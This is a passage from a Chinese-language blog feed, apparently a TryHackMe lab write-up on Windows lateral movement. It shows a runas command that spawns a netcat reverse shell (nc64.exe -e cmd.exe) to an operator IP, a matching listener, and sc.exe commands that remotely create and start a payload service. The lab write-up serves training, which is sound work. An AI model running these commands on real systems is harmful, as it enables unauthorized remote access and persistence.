+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;runas /netonly /user:ZA.TRYHACKME.COM&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;t1_leonard.summers &lt;span class=&#34;token string&#34;&gt;&#34;c:&lt;span class=&#34;token entity&#34; title=&#34;\t&#34;&gt;\t&lt;/span&gt;ools&lt;span class=&#34;token entity&#34; title=&#34;\n&#34;&gt;\n&lt;/span&gt;c64.exe -e cmd.exe 10.50.148.56 4443&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时需要在盒子上开一个 nc -nvlp 4443&lt;br /&gt;
+ 最后，继续使用 sc 远程创建一个新服务，并将其与我们上传的二进制文件关联起来：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;C:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; sc.exe &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;thmiis.za.tryhackme.com create THMservice-3244 &lt;span class=&#34;token assign-left variable&#34;&gt;binPath&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;%windir%\k1t0service.exe&#34;&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; auto&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;C:&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; sc.exe &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;thmiis.za.tryhackme.com start THMservice-3244&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240908100905.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;成功使用 sc 服务反弹回来一个 shell ，并且是根据一个负载和一个服务捆绑。&lt;br /&gt;
+但是一定要注意，我们的服务名称和一个服务的路径一定要是独属于自己的。&lt;/p&gt;
+&lt;h3 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h3&gt;
+&lt;p&gt;看似我们在横向移动，其实我们这种方式是非常鸡肋的。我们无论是 psexec，winrm ，定时任务，sc 服务，ssh，rdp 进行一个横向我们都是需要一个管理员用户的........ 可以称为这个集合为我们拿到一定的凭据之后可以采用的一些姿势。&lt;/p&gt;
+</content>
+        <category term="横向移动" />
+        <updated>2024-09-08T08:37:24.000Z</updated>
+    </entry>
+</feed>
